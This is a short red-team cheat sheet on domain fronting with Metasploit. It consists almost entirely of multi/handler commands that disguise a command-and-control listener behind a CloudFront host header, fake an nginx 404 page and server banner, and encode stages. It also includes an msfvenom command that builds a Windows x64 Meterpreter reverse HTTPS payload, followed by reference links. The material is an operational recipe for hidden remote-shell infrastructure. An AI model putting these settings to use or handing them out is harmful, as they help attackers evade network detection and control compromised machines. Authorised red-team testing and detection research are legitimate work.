# Domain Fronting

Search Tag(s): #red-team-infrastructure #metasploit-framework #domain-fronting

## 01 - Shell Handler

```
msf exploit(multi/handler) > set HttpHostHeader afsa0dfna0sdfhq3.cloudfront.net

msf exploit(multi/handler) > set HttpUserAgent <user_agent>

msf exploit(multi/handler) > set HttpServerName nginx/1.21.2

msf exploit(multi/handler) > set HttpUnknownRequestResponse <html><head><title>404 Not Found</title></head><body><p><h1 align="center">404 Not Found</h1></p><br><p><hr></p><p align="center">nginx/1.21.2</p></body></html>
```

## 02 - The URI length for the stager (at least 5 bytes)

```
msf exploit(multi/handler) > set StagerURILength 420

msf exploit(multi/handler) > set HandlerSSLCert /path/to/cert.pem

msf exploit(multi/handler) > set SSLVersion TLS1.2

msf exploit(multi/handler) > set EnableStageEncoding true

msf exploit(multi/handler) > set StageEncoder x64/zutto_dekiru
```

`$ msfvenom -p windows/x64/meterpreter/reverse_https StagerURILength=420 HandlerSSLCert=/path/to/cert.pem`

* Optional payload advanced settings

```
msf exploit(multi/handler) > set HttpHostHeader

msf exploit(multi/handler) > set HttpCookie
```

---
## References

- [Anti-Forensics Evading Network Detection with Metasploit](https://sapphirex00.medium.com/c2-antiforensics-evading-network-detection-with-metasploit-b400342f20b1)

- [Quickpost: Metasploit User Agent Strings](https://blog.didierstevens.com/2015/03/16/quickpost-metasploit-user-agent-strings/)

- [Catching Meterpreter Callbacks](https://github.com/bats3c/shad0w/wiki/Catching-Meterpreter-Callbacks)

- [Windows Exploit with Word Macro](https://zer0day.tistory.com/303)

- [Conti TTP using Atomic Red Team and Detection Lab C2 infrastructure Hunting](https://michaelkoczwara.medium.com/conti-ttps-using-atomic-red-team-and-detection-lab-c2-infrastructure-hunting-16d159fe0ed8)

- https://labs.jumpsec.com/obfuscating-c2-during-a-red-team-engagement/

- [Chapter 11 Visualizing Metasploit (Use case related about MSGRPC which is the msfrpcd when connecting metasploit remotely)](https://goois.net/chapter-11-visualizing-metasploit-mastering-metasploit-fourth-edition.html)